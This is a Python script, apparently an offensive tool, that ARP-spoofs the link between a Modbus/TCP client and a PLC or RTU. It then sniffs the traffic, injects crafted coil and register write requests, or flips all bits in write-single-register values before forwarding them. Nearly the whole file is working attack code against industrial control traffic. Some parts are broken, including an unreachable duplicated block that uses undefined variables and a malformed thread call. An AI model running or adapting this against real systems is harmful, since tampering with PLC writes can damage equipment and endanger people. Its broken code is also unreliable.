#!/usr/bin/env python3
"""
modbus_mitm_capture.py

Modbus/TCP MITM capture tool using ARP spoofing to reposition traffic
between a Modbus master and slave onto this host, then decoding the
Modbus/TCP traffic that flows through.

Requires: scapy and root privileges
  pip install scapy --break-system-packages

Usage:
  sudo python3 mopi.py -i eth0 -v 192.168.1.50 -t 192.168.1.10
  """

import argparse
import sys
import threading
import time
from datetime import datetime, timezone


try:
    from scapy.all import (
        sniff, sr1, ARP, Ether, TCP, IP, conf, get_if_hwaddr,sendp,srp1,sr,srp
    )
    from scapy.contrib.modbus import (
    ModbusADURequest,
    ModbusPDU01ReadCoilsRequest,
    ModbusPDU02ReadDiscreteInputsRequest,
    ModbusPDU03ReadHoldingRegistersRequest,
    ModbusPDU04ReadInputRegistersRequest,
    ModbusPDU05WriteSingleCoilRequest,
    ModbusPDU06WriteSingleRegisterRequest,
    ModbusPDU0FWriteMultipleCoilsRequest,
    ModbusPDU10WriteMultipleRegistersRequest,
    ModbusADUResponse,
    ModbusPDU06WriteSingleRegisterResponse,
    ModbusPDU01ReadCoilsResponse
)
except ImportError:
    print("scapy is required: pip install scapy --break-system-packages", file=sys.stderr)
    sys.exit(1)

VERSION="0.4"

MODBUS_FUNCTION_CODES = {
    0x01: "Read Coils",                 #1
    0x02: "Read Discrete Inputs",       #2
    0x03: "Read Holding Registers",     #3
    0x04: "Read Input Registers",       #4
    0x05: "Write Single Coil",          #5
    0x06: "Write Single Register",      #6
    0x0F: "Write Multiple Coils",       #10
    0x10: "Write Multiple Registers",   #16
}

class ModifiedModbusRequest:
    def __init__(self,pkt,newPayload=None):
            self.src = pkt[IP].src
            self.dst = pkt[IP].dst
            self.sport = pkt[TCP].sport
            self.dport = pkt[TCP].dport
            self.originalPayload = pkt[ModbusADURequest]
            if newPayload == None:
                self.newPayload = -1
            else:
                self.newPayload = newPayload

def log_line(msg, log_file=None,print_out=False):
    line = f"[{datetime.now(timezone.utc).isoformat(timespec='seconds')}] {msg}"
    if print_out:
        print(line)
    if log_file:
        log_file.write(line + "\n")
        log_file.flush()

def get_mac(ip, iface, timeout=3): #TODO: remove iface parameter
    ans = sr1(ARP(op=1, pdst=ip), timeout=timeout,  verbose=0)
    return ans[ARP].hwsrc if ans else None

def arp_spoof_loop(iface, client_ip, client_mac, server_ip, server_mac, own_mac, stop_event, interval=2):
    while not stop_event.is_set():
        # Tell client that we are the server
        pkt1 = Ether(dst=client_mac, src=own_mac) / ARP(
            op=2, pdst=client_ip, hwdst=client_mac, psrc=server_ip, hwsrc=own_mac
        )
        # Tell server that we are the client
        pkt2 = Ether(dst=server_mac, src=own_mac) / ARP(
            op=2, pdst=server_ip, hwdst=server_mac, psrc=client_ip, hwsrc=own_mac
        )
        sendp(pkt1, iface=iface, verbose=0)
        sendp(pkt2, iface=iface, verbose=0)
        stop_event.wait(interval)

def restore_arp(iface, client_ip, client_mac, server_ip, server_mac):
    # Send correct mappings a few times to overwrite the poisoned entries
    for _ in range(5):
        pkt1 = Ether(dst=client_mac, src=server_mac) / ARP(
            op=2, pdst=client_ip, hwdst=client_mac, psrc=server_ip, hwsrc=server_mac
        )
        pkt2 = Ether(dst=server_mac, src=client_mac) / ARP(
            op=2, pdst=server_ip, hwdst=server_mac, psrc=client_ip, hwsrc=client_mac
        )
        sendp(pkt1, iface=iface, verbose=0)
        sendp(pkt2, iface=iface, verbose=0)
        time.sleep(0.3)

seen_seqs = {}  # key: (src, sport, dst, dport) -> set of seq numbers seen

def stream_key(pkt):
    ip = pkt[IP]
    tcp = pkt[TCP]
    return (ip.src, tcp.sport, ip.dst, tcp.dport)

def is_retransmission(pkt):
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
        return

    key = stream_key(pkt)
    seq = pkt[TCP].seq
    payload_len = len(pkt[TCP].payload)

    # Only meaningful for segments carrying data (or SYN, which consumes a seq)
    if payload_len == 0 and "S" not in pkt[TCP].flags:
        return

    if key not in seen_seqs:
        seen_seqs[key] = set()

    if seq in seen_seqs[key]:
        #print(f"Retransmission detected: {key} seq={seq}")
        return True
    else:
        seen_seqs[key].add(seq)
        #print(f"Not a retransmission: {key} seq={seq}")
        return False

def print_modbus_payload(mb):
    func_code = mb.funcCode
    func_name = MODBUS_FUNCTION_CODES.get(func_code, "Unknown/Reserved")
    print(f"Function:\t\t{func_name} ({func_code})")

    # The actual PDU is whatever Scapy parsed as the payload of the ADU
    pdu = mb.payload

    # Map of field name -> friendly label, checked in order, only printed if present
    field_labels = [
        ("startAddr", "Start Address"),
        ("quantity", "Quantity"),
        ("outputAddr", "Coil Address"),
        ("outputValue", "Coil Value"),
        ("registerAddr", "Register Address"),
        ("registerValue", "Register Value"),
        ("quantityOutput", "Quantity (Coils)"),
        ("quantityRegisters", "Quantity (Registers)"),
        ("outputsValue", "Values"),
        ("byteCount", "Byte Count"),
        ("registerVal", "Register Values"),
        ("coilStatus", "Coil Status"),
    ]

    for field_name, label in field_labels:
        if hasattr(pdu, field_name):
            value = getattr(pdu, field_name)
            print(f"{label}:\t\t{value}")

def interactive_packet_craft():
    p=""
    print("1) Read Coils")
    print("2) Read Discrete Inputs")
    print("3) Read Holding Registers")
    print("4) Read Input Registers")
    print("5) Write Single Coil")
    print("6) Write Single Register")
    print("10) Write Multiple Coils")
    print("16) Write Multiple Register")

    func_choice = int(input("Select your function: "))
    print(func_choice)
    print("Selected: ",MODBUS_FUNCTION_CODES.get(func_choice))

    return(build_request_pdu(func_choice))

def build_request_pdu(func_code: int):
    if func_code in (0x01, 0x02, 0x03, 0x04):
        # All read requests share the same two fields
        start_addr = int(input("Start address: "), 0)
        quantity = int(input("Quantity: "))

        if func_code == 0x01:
            return ModbusPDU01ReadCoilsRequest(startAddr=start_addr, quantity=quantity)
        elif func_code == 0x02:
            return ModbusPDU02ReadDiscreteInputsRequest(startAddr=start_addr, quantity=quantity)
        elif func_code == 0x03:
            return ModbusPDU03ReadHoldingRegistersRequest(startAddr=start_addr, quantity=quantity)
        elif func_code == 0x04:
            return ModbusPDU04ReadInputRegistersRequest(startAddr=start_addr, quantity=quantity)

    elif func_code == 0x05:
        output_addr = int(input("Coil address: "), 0)
        state = input("State (on/off): ").strip().lower()
        output_value = 0xFF00 if state == "on" else 0x0000
        return ModbusPDU05WriteSingleCoilRequest(outputAddr=output_addr, outputValue=output_value)

    elif func_code == 0x06:
        reg_addr = int(input("Register address: "), 0)
        reg_value = int(input("Value to write: "), 0)
        return ModbusPDU06WriteSingleRegisterRequest(registerAddr=reg_addr, registerValue=reg_value)

    elif func_code == 0x0F:
        start_addr = int(input("Start address: "), 0)
        values_str = input("Coil values, comma separated (e.g. 1,0,1,1): ")
        values = [int(v.strip()) for v in values_str.split(",")]
        return ModbusPDU0FWriteMultipleCoilsRequest(
            startAddr=start_addr, quantityOutput=len(values), outputsValue=values
        )

    elif func_code == 0x10:
        start_addr = int(input("Start address: "), 0)
        values_str = input("Register values, comma separated (e.g. 100,200,300): ")
        values = [int(v.strip(), 0) for v in values_str.split(",")]
        return ModbusPDU10WriteMultipleRegistersRequest(
            startAddr=start_addr, quantityRegisters=len(values), outputsValue=values
        )

    raise ValueError(f"No PDU builder implemented for function code {func_code}")
    if func_code in (0x01, 0x02, 0x03, 0x04):
        # All read requests share the same two fields
        byteCount = int(input("Start address: "), 0)
        quantity = int(input("Quantity: "))

        if func_code == 0x01:
            return ModbusPDU01ReadCoilsResponse(byteCount=start_addr, quantity=quantity)
        elif func_code == 0x02:
            return ModbusPDU02ReadDiscreteInputsRequest(startAddr=start_addr, quantity=quantity)
        elif func_code == 0x03:
            return ModbusPDU03ReadHoldingRegistersRequest(startAddr=start_addr, quantity=quantity)
        elif func_code == 0x04:
            return ModbusPDU04ReadInputRegistersRequest(startAddr=start_addr, quantity=quantity)

    elif func_code == 0x05:
        output_addr = int(input("Coil address: "), 0)
        state = input("State (on/off): ").strip().lower()
        output_value = 0xFF00 if state == "on" else 0x0000
        return ModbusPDU05WriteSingleCoilRequest(outputAddr=output_addr, outputValue=output_value)

    elif func_code == 0x06:
        reg_addr = int(input("Register address: "), 0)
        reg_value = int(input("Value to write: "), 0)
        return ModbusPDU06WriteSingleRegisterRequest(registerAddr=reg_addr, registerValue=reg_value)

    elif func_code == 0x0F:
        start_addr = int(input("Start address: "), 0)
        values_str = input("Coil values, comma separated (e.g. 1,0,1,1): ")
        values = [int(v.strip()) for v in values_str.split(",")]
        return ModbusPDU0FWriteMultipleCoilsRequest(
            startAddr=start_addr, quantityOutput=len(values), outputsValue=values
        )

    elif func_code == 0x10:
        start_addr = int(input("Start address: "), 0)
        values_str = input("Register values, comma separated (e.g. 100,200,300): ")
        values = [int(v.strip(), 0) for v in values_str.split(",")]
        return ModbusPDU10WriteMultipleRegistersRequest(
            startAddr=start_addr, quantityRegisters=len(values), outputsValue=values
        )

    raise ValueError(f"No PDU builder implemented for function code {func_code}")

def flip_all_bits(value: int, width: int = 16) -> int:
    mask = (1 << width) - 1  # e.g. 0xFFFF for 16-bit
    return value ^ mask

modified_modbus_requests: dict[int, ModifiedModbusRequest] = {}
    
def handle_packet(pkt, port, log_file,mappings,own_mac,mode,crafted_pkt):
    mac_src = own_mac
    dst = pkt[IP].dst 

    pkt[Ether].src=mac_src
    pkt[Ether].dst=mappings[dst]
    
    if not pkt.haslayer(ModbusADUResponse) and not pkt.haslayer(ModbusADURequest):
        print("Not a modbus response or request")
        sendp(pkt,loop=0,inter=0.2,verbose=0)
        return

    #print("Is a modbus response or request")

    if is_retransmission(pkt):
        return

    tcp = pkt[TCP]
    if tcp.sport != port and tcp.dport != port:
        return
    
    direction = "req " if tcp.dport == port else "resp"
    src = f"{pkt[IP].src}:{tcp.sport}"
    dst = f"{pkt[IP].dst}:{tcp.dport}"
    log_line(f"{direction} {src:>21} -> {dst:<21}", log_file)


    #################
    #MODBUS RESPONSE#
    #################
    if pkt.haslayer(ModbusADUResponse):
        print("Got a modbus response")
        print_modbus_payload(pkt[ModbusADUResponse])
        # TODO: Revist trickster mode
        # if trickster:
        #     print("trickster mode enabled")
        #     if pkt[ModbusADUResponse].funcCode == 0x06: # write single register
        #         originalValue = modified_modbus_requests[pkt[ModbusADUResponse].transId].originalValue
        #         print("Original value was: ",originalValue)
        #         pkt[ModbusADUResponse].registerValue = originalValue
        # match mode:
        #     case "injection":
        #         print("XXXXXXX")
        #         trans_id = pkt[ModbusADUResponse].transId
        #         print("TransID:",trans_id)
        #         original_payload = modified_modbus_requests[int(trans_id)]
        #         print("Found original payload: ",trans_id)
        #         func_code = original_payload.funcCode
        #         print("Func Code:",func_code)
        #         trans_id = original_payload.transId
        #         print("Trans ID: ",trans_id)
        #         unit_id = original_payload.unitId
        #         print("Unit ID: ",unit_id)
        #         original_value = original_payload.originalValue
        #         print("Original Value: ",original_value)
        #         register_addr = original_payload.registerAddr
        #         print("Register Addr: ",register_addr)
        #         if func_code == 0x06:
        #             print("Func Code = 0x06")
        #             response_payload = ModbusPDU06WriteSingleRegisterResponse()
        #             response_payload.registerAddr = register_addr
        #             response_payload.registerValue = original_value
   
        #         stripped = pkt.copy()
        #         stripped[TCP].remove_payload()
        #         modbus_payload = ModbusADUResponse(transId=trans_id, unitId=unit_id) / response_payload
        #         pkt = stripped / modbus_payload
        #         print("\nCrafted Packet: ")
        #         print(pkt.show(dump=True))

    ################
    #MODBUS REQUEST#
    ################   
    elif pkt.haslayer(ModbusADURequest):
        match mode:
            case "injection": #inject custom packet
                print("Crafting custom packet...")
                trans_id = pkt[ModbusADURequest].transId
                unit_id = pkt[ModbusADURequest].unitId

                stripped = pkt.copy()
                stripped[TCP].remove_payload()
                modbus_payload = ModbusADURequest(transId=trans_id, unitId=unit_id) / crafted_pkt
                modified_modbus_requests[pkt[ModbusADURequest].transId] = ModifiedModbusRequest(pkt)
                pkt = stripped / modbus_payload
                print("\nCrafted Packet: ")
                print(pkt.show(dump=True))


            case "passive": # just sniffing traffic
                print("\nRequest Recieved:")
                print_modbus_payload(pkt[ModbusADURequest])    
                print("-"*16)

            case "flip": #bit flip register values
                if pkt[ModbusADURequest].funcCode != 6:
                    print("Flip mode only supports function code 0x06.")
                elif hasattr(pkt[ModbusADURequest],"registerValue"):
                    print_modbus_payload(pkt[ModbusADURequest]) 
                    flippedValue = flip_all_bits(pkt[ModbusADURequest].registerValue,width=16)
                    print("\nFlipped value: ", flippedValue)

                    modified_modbus_requests[pkt[ModbusADURequest].transId] = ModifiedModbusRequest(pkt)
                    pkt[ModbusADURequest].registerValue = flippedValue
                else:
                    print("Request does not have a register value.")
            case _:
                print("Not a valid mode.")

    del pkt[TCP].chksum
    del pkt[IP].chksum

    sendp(pkt, verbose=0)


def banner():
    print(f'''                                                                                                 
██▄  ▄██  ▄▄▄  ▄▄▄▄  ▄▄▄▄  ▄▄ ▄▄  ▄▄▄▄   █████▄  ▄▄▄   ▄▄▄▄ ▄▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄   ██ ▄▄  ▄▄   ▄▄ ▄▄▄▄▄  ▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄  ▄▄▄▄  
██ ▀▀ ██ ██▀██ ██▀██ ██▄██ ██ ██ ███▄▄   ██▄▄█▀ ██▀██ ██▀▀▀ ██▄█▀ ██▄▄    ██     ██ ███▄██   ██ ██▄▄  ██▀▀▀   ██  ██▀██ ██▄█▄ 
██    ██ ▀███▀ ████▀ ██▄█▀ ▀███▀ ▄▄██▀   ██     ██▀██ ▀████ ██ ██ ██▄▄▄   ██     ██ ██ ▀██ ▄▄█▀ ██▄▄▄ ▀████   ██  ▀███▀ ██ ██ 

by cdino, v{VERSION}                                                                                                                         
''')

def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-i", "--interface", required=True, help="Interface to use")
    ap.add_argument("-v","--client", required=True, help="IP of the Modbus client")
    ap.add_argument("-t","--server", required=True, help="IP of the Modbus server (PLC/RTU)")
    ap.add_argument("-p","--port", type=int, default=502, help="Modbus/TCP port (default 502)")
    ap.add_argument("--mode", required=True, help="Mode to run in (e.g. passive, injection, flip)")
    ap.add_argument("--log", help="Optional path to append decoded output to")

    ap.add_argument("--arp-interval", type=float, default=2.0, help="Seconds between spoofed ARP bursts")
    args = ap.parse_args()

    banner()
    print("This tool actively repositions traffic via ARP spoofing.")
    time.sleep(1)
    print(f"server scope: client={args.client}  server={args.server}  iface={args.interface}")

    log_file = open(args.log, "a") if args.log else None
    stop_event = threading.Event()

    try:
        conf.iface = args.interface
    except Exception as e:
        log_line("[-] Error: "+str(e),log_file)
        exit(1)

    own_mac = get_if_hwaddr(args.interface) 
    client_mac = get_mac(args.client, args.interface)
    server_mac = get_mac(args.server, args.interface)

    if not client_mac or not server_mac:
        print("Could not resolve MAC address for client or server — aborting.", file=sys.stderr)
        sys.exit(1)

    log_line(f"Resolved client {args.client} -> {client_mac}", log_file)
    log_line(f"Resolved server {args.server} -> {server_mac}", log_file)

    spoof_thread = threading.Thread(
        server=arp_spoof_loop,
        args=(args.interface, args.client, client_mac, args.server, server_mac, own_mac, stop_event, args.arp_interval),
        daemon=True,
    )
    spoof_thread.start()

    crafted_pkt=""
    mode = (args.mode).lower()

    match mode:
        case "passive":
            print("Passive Mode")
        case "injection":
            print("Injection Mode")
            crafted_pkt = interactive_packet_craft()
        case "flip":
            print("Flip Mode")
        case _:
            print("No mode selected, exiting") #this should be impossible
            exit(1)

    bpf_filter = f"tcp port {args.port} and (host {args.client} or host {args.server}) and not ether src {own_mac}" 


    mappings = {args.client:client_mac,args.server:server_mac}

    try:
        sniff(iface=args.interface, filter=bpf_filter,
              prn=lambda p: handle_packet(p, args.port, log_file,mappings,own_mac,mode,crafted_pkt), store=False)
    except KeyboardInterrupt:
        pass
    finally:
        log_line("Stopping — restoring ARP tables.", log_file)
        stop_event.set()
        spoof_thread.join(timeout=2)
        restore_arp(args.interface, args.client, client_mac, args.server, server_mac)
        if log_file:
            log_file.close()


if __name__ == "__main__":
    main()